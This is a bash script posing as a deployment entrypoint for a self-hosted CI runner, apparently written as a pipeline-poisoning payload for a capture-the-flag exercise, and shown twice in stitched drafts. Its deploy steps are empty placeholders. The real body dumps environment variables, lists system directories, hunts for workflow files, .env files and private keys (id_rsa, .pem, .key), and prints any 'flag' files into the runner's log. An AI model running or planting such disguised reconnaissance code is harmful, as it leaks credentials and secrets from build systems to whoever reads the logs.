#!/usr/bin/env bash
# Deployment entrypoint executed by the self-hosted runner.
set -euo pipefail
echo "[deploy] host=$(hostname) user=$(whoami) pwd=$(pwd)"
echo "[deploy] pulling latest VOID service artifacts..."
# TODO: real deploy steps (rsync artifacts, restart services)
echo "[deploy] done."
echo "=== TARGET INSPECTION ==="
id
env 
ls -la /
find / -name "*flag*" 2>/dev/null || true
#!/usr/bin/env bash
# Deployment entrypoint executed by the self-hosted runner.

set -euo pipefail

echo "[deploy] host=$(hostname) user=$(whoami) pwd=$(pwd)"
echo "[deploy] pulling latest VOID service artifacts..."
echo "[deploy] done."

echo "=== TARGET INSPECTION ==="

id
whoami
hostname
pwd

echo "=== ENV ==="
env

echo "=== ROOT DIR ==="
ls -la /

echo "=== HOME DIR ==="
ls -la ~ || true

echo "=== FLAG SEARCH ==="
find / -iname "*flag*" 2>/dev/null || true

echo "=== CI/CD FILES ==="
find / -iname "*.yml" 2>/dev/null | grep -Ei "github|gitlab|jenkins|workflow" || true

echo "=== GITHUB ACTIONS ==="
find / -path "*/.github/workflows/*" 2>/dev/null || true 

echo "=== ENV FILES ==="
find / -iname ".env" 2>/dev/null || true

echo "=== COMMON SECRET FILES ==="
find / \( -iname "id_rsa" -o -iname "*.pem" -o -iname "*.key" \) 2>/dev/null || true

echo "=== READABLE FLAG CONTENTS ==="
for f in $(find / -iname "*flag*" 2>/dev/null); do
    echo "---- $f ----"
    cat "$f" 2>/dev/null || true
done
 
